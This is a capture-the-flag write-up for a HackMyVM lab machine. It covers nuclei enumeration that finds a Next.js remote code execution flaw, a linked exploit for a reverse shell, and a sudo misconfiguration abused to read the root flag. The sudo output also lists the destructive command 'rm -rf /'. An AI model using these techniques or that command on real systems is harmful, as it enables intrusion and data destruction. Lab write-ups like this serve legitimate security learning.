# React: A HackMyVM Machine

Difficulty: Easy (personally, I'd say it's VERY EASY, completely beginner level)

## Enumeration

- Ports 22,80,3000 are open.
- Port 80 contains an apache webapp with seemingly nothing of value.
- Port 3000 contains a next.js application.
- Running nuclei on port 3000 reveals this CVE.

```
[CVE-2025-55182] [http] [critical] http://192.168.0.107:3000/
```

- This is the React2Shell exploit, which provides RCE on any vulnerable React app through prototype pollution.

## Initial Foothold

- I used [this exploit](https://github.com/sickwell/CVE-2025-55182) to gain a reverse shell.
- The flag is located at `/home/bot/user.txt`

## Privilege Escalation

- On running `sudo -l` we get this:

```bash
Matching Defaults entries for bot on React:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bot may run the following commands on React:
    (ALL) NOPASSWD: /opt/react2shell/scanner.py
    (ALL) NOPASSWD: /usr/bin/rm -rf /
```

- So we can run `scanner.py` as root, obviously `(ALL) NOPASSWD: /usr/bin/rm -rf /` is not meant to be run 💀.
- On running scanner.py using sudo we get this:

```bash
bot@React:~$ sudo /opt/react2shell/scanner.py
usage: scanner.py [-h] (-u URL | -l LIST) [-t THREADS] [--timeout TIMEOUT] [-o OUTPUT] [--all-results] [-k] [-H HEADER] [-v] [-q] [--no-color]
                  [--safe-check] [--windows] [--waf-bypass] [--waf-bypass-size KB]
scanner.py: error: one of the arguments -u/--url -l/--list is required
```

- Since we can run this as sudo, we can pass in `/root/root.txt` as an argument and it should be able to read it.
- So, to read the root flag we can do this:

```bash
bot@React:~$ sudo /opt/react2shell/scanner.py -l /root/root.txt

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[ERROR] flag{censored} - Connection Error: HTTPSConnectionPool(host='flag%7bcensored%7d', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("HTTPSConnection(host='flag%7bcensored%7d', port=443): Failed to resolve 'flag%7bcensored%7d' ([Errno -2] Name or service not known)"))

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 0
  Not vulnerable: 1
  Errors: 0
============================================================
```

- We can see that it read the flag and displayed it in the error message.

Happy Hacking :)
